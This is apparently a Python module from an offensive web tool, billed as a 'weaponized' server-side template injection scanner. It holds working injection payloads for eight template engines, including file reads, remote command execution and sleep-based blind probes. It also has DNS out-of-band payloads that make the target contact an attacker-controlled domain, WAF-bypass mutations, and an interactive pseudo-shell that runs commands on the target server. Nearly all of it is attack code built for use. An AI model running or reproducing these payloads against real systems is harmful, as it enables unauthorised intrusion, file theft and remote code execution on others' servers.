# HikariSystem Tsurugi/modules/ssti.py
"""
WEAPONIZED SSTI MODULE - Server-Side Template Injection
From detection to exploitation.

Features:
- 8 Template Engines: Jinja2, Twig, Freemarker, Velocity, SpEL, OGNL, Smarty, Mako
- Context Breaking: Auto-escape existing template contexts
- Auto-RCE: Automatic escalation from detection to command execution
- Time-Based Blind: CPU exhaustion and sleep-based detection
- Payload Mutation: WAF bypass via ofuscação
- Interactive Shell: Pseudo-shell via SSTI RCE

NO TPLMAP. WE BUILD THE WEAPON.
"""
import time
import asyncio
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dataclasses import dataclass
from core.ui import console, log_info, log_success, log_warning, log_error
from core.logger import save_loot
from core.requester import TsurugiSession
from rich.panel import Panel
from rich.prompt import Prompt


# ═══════════════════════════════════════════════════════════════════════════════
#  CONTEXT BREAKERS - Escape existing template contexts
# ═══════════════════════════════════════════════════════════════════════════════

CONTEXT_BREAKERS = [
    "",                          # Clean injection
    "'}}",                       # Close Python/Jinja string
    "\"}}",                      # Close double-quoted string  
    "%}}{%",                     # Close Jinja block
    "-->",                       # Close HTML comment
    "*/",                        # Close C-style comment
    "\r\n",                      # CRLF injection
    "\"}} ${",                   # Java/Freemarker string escape
    "}}{{",                      # Close and reopen Jinja
    "#}}",                       # Close Velocity quiet reference
    "]}",                        # Close array/object
]


# ═══════════════════════════════════════════════════════════════════════════════
#  ENGINE DETECTION PAYLOADS
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class EngineSignature:
    """Template engine detection signature."""
    name: str
    payloads: List[Tuple[str, str]]  # (payload, expected_output)
    

ENGINES = {
    "jinja2": EngineSignature(
        name="Jinja2 (Python)",
        payloads=[
            ("{{7*'7'}}", "7777777"),
            ("{{config}}", "Config"),
            ("{{lipsum}}", "lipsum"),
        ]
    ),
    "twig": EngineSignature(
        name="Twig (PHP)",
        payloads=[
            ("{{7*7}}", "49"),
            ("{{_self}}", "Object"),
            ("{{app}}", "app"),
        ]
    ),
    "freemarker": EngineSignature(
        name="Freemarker (Java)",
        payloads=[
            ("${7*7}", "49"),
            ("${.now}", "20"),
            ("<#assign x=7*7>${x}", "49"),
        ]
    ),
    "velocity": EngineSignature(
        name="Velocity (Java)",
        payloads=[
            ("#set($x=7*7)$x", "49"),
            ("$class.inspect('java.lang.Runtime')", "Runtime"),
        ]
    ),
    "spel": EngineSignature(
        name="SpEL (Spring)",
        payloads=[
            ("${T(java.lang.Math).random()}", "0."),
            ("${7*7}", "49"),
            ("#{7*7}", "49"),
        ]
    ),
    "ognl": EngineSignature(
        name="OGNL (Struts)",
        payloads=[
            ("%{7*7}", "49"),
            ("${7*7}", "49"),
            ("%{#application}", "application"),
        ]
    ),
    "smarty": EngineSignature(
        name="Smarty (PHP)",
        payloads=[
            ("{7*7}", "49"),
            ("{$smarty.version}", "Smarty"),
        ]
    ),
    "mako": EngineSignature(
        name="Mako (Python)",
        payloads=[
            ("${7*7}", "49"),
        ]
    ),
}


# ═══════════════════════════════════════════════════════════════════════════════
#  RCE PAYLOADS - Auto-escalation to command execution
# ═══════════════════════════════════════════════════════════════════════════════

RCE_PAYLOADS = {
    "jinja2": {
        "read_file": "{{request.application.__globals__.__builtins__.open('FILE').read()}}",
        "exec_cmd": "{{request.application.__globals__.__builtins__.__import__('os').popen('COMMAND').read()}}",
        "exec_cmd_alt": "{{lipsum.__globals__['os'].popen('COMMAND').read()}}",
        "exec_cmd_config": "{{config.__class__.__init__.__globals__['os'].popen('COMMAND').read()}}",
    },
    "twig": {
        "read_file": "{{'/etc/passwd'|file_excerpt(1,100)}}",
        "exec_cmd": "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('COMMAND')}}",
        "exec_cmd_alt": "{{['COMMAND']|filter('system')}}",
    },
    "freemarker": {
        "read_file": '<#assign f=.get_optional_template("FILE")>${f}',
        "exec_cmd": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("COMMAND")}',
    },
    "velocity": {
        "exec_cmd": "#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime().exec('COMMAND'))",
    },
    "spel": {
        "read_file": "${new java.util.Scanner(new java.io.File('FILE')).useDelimiter('\\\\A').next()}",
        "exec_cmd": "${T(java.lang.Runtime).getRuntime().exec('COMMAND')}",
        "exec_cmd_output": "${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('COMMAND').getInputStream()).useDelimiter('\\\\A').next()}",
    },
    "ognl": {
        "exec_cmd": "%{(#rt=@java.lang.Runtime@getRuntime().exec('COMMAND'))}",
    },
    "smarty": {
        "exec_cmd": "{system('COMMAND')}",
    },
    "mako": {
        "read_file": "${open('FILE').read()}",
        "exec_cmd": "${__import__('os').popen('COMMAND').read()}",
    },
}


# ═══════════════════════════════════════════════════════════════════════════════
#  TIME-BASED BLIND PAYLOADS
# ═══════════════════════════════════════════════════════════════════════════════

TIME_PAYLOADS = {
    "jinja2": [
        ("{% for x in range(0,10000000) %}{% endfor %}", 3),
        ("{{lipsum.__globals__['os'].popen('sleep 5').read()}}", 5),
    ],
    "freemarker": [
        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}', 5),
        ("<#list 1..10000000 as x></#list>", 3),
    ],
    "spel": [
        ("${T(java.lang.Thread).sleep(5000)}", 5),
    ],
    "velocity": [
        ("#set($s=$class.inspect('java.lang.Thread').type.sleep(5000))", 5),
    ],
    "twig": [
        ("{{['sleep','5']|filter('system')}}", 5),
    ],
    "ognl": [
        ("%{@java.lang.Thread@sleep(5000)}", 5),
    ],
}


# ═══════════════════════════════════════════════════════════════════════════════
#  PAYLOAD MUTATIONS - WAF Bypass
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class OOBPayload:
    """OOB payload for blind SSTI via DNS."""
    engine: str
    template: str  # Use DOMAIN as placeholder

OOB_PAYLOADS = [
    OOBPayload("jinja2", "{{request.application.__globals__.__builtins__.__import__('socket').gethostbyname('DOMAIN')}}"),
    OOBPayload("jinja2", "{{lipsum.__globals__['os'].popen('nslookup DOMAIN').read()}}"),
    OOBPayload("freemarker", '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup DOMAIN")}'),
    OOBPayload("spel", "${T(java.net.InetAddress).getByName('DOMAIN')}"),
    OOBPayload("velocity", "$class.inspect('java.net.InetAddress').type.getByName('DOMAIN')"),
    OOBPayload("twig", "{{['nslookup DOMAIN']|filter('system')}}"),
    OOBPayload("ognl", "%{@java.net.InetAddress@getByName('DOMAIN')}"),
    OOBPayload("mako", "${__import__('socket').gethostbyname('DOMAIN')}"),
]


def mutate_payload(payload: str, engine: str) -> List[str]:
    """Generate mutated versions of payload for WAF bypass."""
    mutations = [payload]
    
    if engine == "jinja2":
        mutations.append(payload.replace("config", "con~fig"))
        mutations.append(payload.replace("config", "['con','fig']|join"))
        mutations.append(payload.replace("{{", "\u007b\u007b").replace("}}", "\u007d\u007d"))
    elif engine == "freemarker":
        mutations.append(payload.replace("${", "$" + "{"))
    elif engine == "spel":
        mutations.append(payload.replace("exec", "e"+"x"+"e"+"c"))
        
    return mutations


# ═══════════════════════════════════════════════════════════════════════════════
#  CORE DETECTION & EXPLOITATION
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class SSTIFinding:
    """SSTI vulnerability finding."""
    param: str
    engine: str
    engine_name: str
    context_breaker: str
    confidence: str
    payload: str
    response_snippet: str
    rce_confirmed: bool = False
    rce_output: str = None


def detect_in_response(response_text: str, expected: str) -> bool:
    """Check if expected output is in response."""
    if not response_text or not expected:
        return False
    return expected.lower() in response_text.lower()


def detect_engine(url: str, param: str, requester: TsurugiSession) -> Optional[SSTIFinding]:
    """Detect which template engine is vulnerable."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    for breaker in CONTEXT_BREAKERS:
        for engine_key, engine_sig in ENGINES.items():
            for payload_template, expected in engine_sig.payloads:
                
                full_payload = breaker + payload_template
                test_params = params.copy()
                test_params[param] = [full_payload]
                query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, query, parsed.fragment
                ))
                
                try:
                    resp = requester.get(test_url, timeout=10)
                    if not resp:
                        continue
                    
                    if detect_in_response(resp.text, expected):
                        confidence = "high" if len(expected) > 2 else "medium"
                        
                        return SSTIFinding(
                            param=param,
                            engine=engine_key,
                            engine_name=engine_sig.name,
                            context_breaker=breaker if breaker else "(none)",
                            confidence=confidence,
                            payload=full_payload,
                            response_snippet=resp.text[:500]
                        )
                except Exception:
                    continue
    
    return None


def time_based_detect(url: str, param: str, requester: TsurugiSession) -> Optional[SSTIFinding]:
    """Blind SSTI detection via time-based payloads."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    for engine_key, time_tests in TIME_PAYLOADS.items():
        for payload, expected_delay in time_tests:
            
            for breaker in CONTEXT_BREAKERS[:3]:
                full_payload = breaker + payload
                
                test_params = params.copy()
                test_params[param] = [full_payload]
                query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, query, parsed.fragment
                ))
                
                try:
                    start = time.time()
                    resp = requester.get(test_url, timeout=expected_delay + 5)
                    elapsed = time.time() - start
                    
                    if elapsed >= (expected_delay - 0.5):
                        return SSTIFinding(
                            param=param,
                            engine=engine_key,
                            engine_name=ENGINES[engine_key].name,
                            context_breaker=breaker if breaker else "(none)",
                            confidence="medium",
                            payload=full_payload,
                            response_snippet=f"Time-based: {elapsed:.2f}s delay"
                        )
                except Exception:
                    continue
    
    return None


def oob_detect(url: str, param: str, requester: TsurugiSession, oob_client) -> Optional[SSTIFinding]:
    """
    Detect Blind SSTI via DNS Interaction (Out-of-Band).
    Crucial for async processing or when output/timing is suppressed.
    """
    if not oob_client or not oob_client.registered:
        return None
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    log_info("Sending OOB payloads...")
    
    for oob in OOB_PAYLOADS:
        # Generate unique domain for correlation
        marker = f"ssti_{oob.engine}_{param}"
        payload_domain = f"{marker}.{oob_client.domain}"
        
        # Build payload with domain
        full_payload = oob.template.replace("DOMAIN", payload_domain)
        
        # Try with and without context breakers
        for breaker in ["", "'}}", '"}}']:
            attack = breaker + full_payload
            
            test_params = params.copy()
            test_params[param] = [attack]
            query = urlencode(test_params, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, query, parsed.fragment
            ))
            
            try:
                # Fire and forget - we don't expect useful HTTP response
                requester.get(test_url, timeout=3)
            except Exception:
                pass
    
    # Wait for DNS callbacks
    time.sleep(2)
    
    # Poll for interactions
    interactions = oob_client.poll()
    
    for interaction in interactions:
        # Check if this is one of our SSTI payloads
        raw_id = interaction.get("raw-request", "") or interaction.get("full-id", "")
        
        for oob in OOB_PAYLOADS:
            marker = f"ssti_{oob.engine}_{param}"
            if marker in raw_id.lower() or marker in str(interaction).lower():
                return SSTIFinding(
                    param=param,
                    engine=oob.engine,
                    engine_name=f"{oob.engine.upper()} (OOB Confirmed)",
                    context_breaker="Dynamic",
                    confidence="critical",
                    payload="OOB_DNS_EXFILTRATION",
                    response_snippet=f"DNS/HTTP interaction received via Interactsh"
                )
    
    return None


def try_rce(url: str, finding: SSTIFinding, requester: TsurugiSession, 
            command: str = "id") -> Tuple[bool, str]:
    """Attempt RCE using detected engine."""
    engine = finding.engine
    breaker = finding.context_breaker if finding.context_breaker != "(none)" else ""
    
    if engine not in RCE_PAYLOADS:
        return False, "No RCE payload for this engine"
    
    rce_templates = RCE_PAYLOADS[engine]
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    for rce_type, rce_template in rce_templates.items():
        if "exec_cmd" not in rce_type:
            continue
        
        rce_payload = breaker + rce_template.replace("COMMAND", command)
        
        for mutated in mutate_payload(rce_payload, engine):
            test_params = params.copy()
            test_params[finding.param] = [mutated]
            query = urlencode(test_params, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, query, parsed.fragment
            ))
            
            try:
                resp = requester.get(test_url, timeout=15)
                if not resp:
                    continue
                
                if "uid=" in resp.text or "gid=" in resp.text:
                    import re
                    match = re.search(r'uid=\d+.*?(?:\s|<|$)', resp.text)
                    output = match.group(0) if match else "RCE confirmed (output unclear)"
                    return True, output.strip()
                
                if "\\" in resp.text and command == "whoami":
                    return True, "RCE confirmed (Windows)"
                    
            except Exception:
                continue
    
    return False, "RCE payloads failed"


def spawn_shell(url: str, finding: SSTIFinding, requester: TsurugiSession):
    """Interactive pseudo-shell via SSTI RCE."""
    console.print("\n[bold green]🔥 RCE CONFIRMED. Spawning shell...[/bold green]")
    console.print("[dim]Type 'exit' to quit. Commands are executed on target.[/dim]")
    console.print(f"[dim]Engine: {finding.engine_name} | Param: {finding.param}[/dim]\n")
    
    while True:
        try:
            cmd = Prompt.ask("[bold red]$[/bold red]")
            
            if cmd.lower() in ["exit", "quit", "q"]:
                console.print("[yellow]Shell closed.[/yellow]")
                break
            
            if not cmd.strip():
                continue
            
            success, output = try_rce(url, finding, requester, cmd)
            
            if success:
                console.print(f"[green]{output}[/green]")
            else:
                console.print(f"[red]Command failed: {output}[/red]")
                
        except KeyboardInterrupt:
            console.print("\n[yellow]Shell closed.[/yellow]")
            break


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN SCANNER
# ═══════════════════════════════════════════════════════════════════════════════

def run_ssti_scan(url: str, cookie: str = None, proxy: str = None, 
                  auto_exploit: bool = True, shell: bool = False,
                  oob_client = None):
    """
    Run comprehensive SSTI scan with auto-exploitation.
    
    Args:
        url: Target URL with parameters
        cookie: Session cookie
        proxy: Proxy URL
        auto_exploit: Automatically attempt RCE on detection
        shell: Spawn interactive shell on RCE confirmation
        oob_client: Interactsh client for blind OOB detection
    """
    console.print(f"\n[bold magenta][*] WEAPONIZED SSTI SCANNER[/bold magenta] → [yellow]{url}[/yellow]")
    
    if auto_exploit:
        console.print("[bold cyan][*] Auto-exploitation ENABLED[/bold cyan]")
    
    requester = TsurugiSession(cookie_string=cookie, proxy=proxy)
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        log_error("No parameters found in URL. SSTI requires injectable parameters.")
        return []
    
    log_info(f"Testing {len(params)} parameters...")
    
    findings = []
    
    for param in params.keys():
        console.print(f"\n[cyan]Testing param:[/cyan] [bold]{param}[/bold]")
        
        log_info("Phase 1: Engine Detection...")
        finding = detect_engine(url, param, requester)
        
        if not finding:
            log_info("Phase 2: Time-Based Blind Detection...")
            finding = time_based_detect(url, param, requester)
        
        # Phase 3: OOB Detection (last resort for true blind)
        if not finding and oob_client:
            log_info("Phase 3: Out-of-Band (DNS) Detection...")
            finding = oob_detect(url, param, requester, oob_client)
        
        if finding:
            console.print(Panel(
                f"[bold]Engine:[/bold] {finding.engine_name}\n"
                f"[bold]Confidence:[/bold] {finding.confidence.upper()}\n"
                f"[bold]Context Breaker:[/bold] {finding.context_breaker}\n"
                f"[bold]Payload:[/bold] {finding.payload[:80]}...",
                title=f"[bold green]✓ SSTI DETECTED in '{param}'[/bold green]",
                border_style="green"
            ))
            
            if auto_exploit and finding.confidence in ["high", "medium"]:
                log_info("Phase 3: Attempting RCE...")
                rce_success, rce_output = try_rce(url, finding, requester)
                
                if rce_success:
                    finding.rce_confirmed = True
                    finding.rce_output = rce_output
                    
                    console.print(Panel(
                        f"[bold green]{rce_output}[/bold green]",
                        title="[bold red]🔥 RCE CONFIRMED[/bold red]",
                        border_style="red"
                    ))
                    
                    if shell:
                        spawn_shell(url, finding, requester)
                else:
                    log_warning(f"RCE attempt failed: {rce_output}")
            
            findings.append(finding)
        else:
            console.print(f"[dim]No SSTI in '{param}'[/dim]")
    
    if findings:
        console.print(f"\n[bold green][+] Found {len(findings)} SSTI vulnerabilities![/bold green]")
        
        rce_count = sum(1 for f in findings if f.rce_confirmed)
        if rce_count:
            console.print(f"[bold red][!] {rce_count} with confirmed RCE[/bold red]")
        
        for finding in findings:
            save_loot("ssti", url, {
                "param": finding.param,
                "engine": finding.engine,
                "engine_name": finding.engine_name,
                "confidence": finding.confidence,
                "rce_confirmed": finding.rce_confirmed,
                "rce_output": finding.rce_output,
                "payload": finding.payload,
            })
    else:
        console.print("\n[green]✓ No SSTI vulnerabilities found.[/green]")
    
    return findings
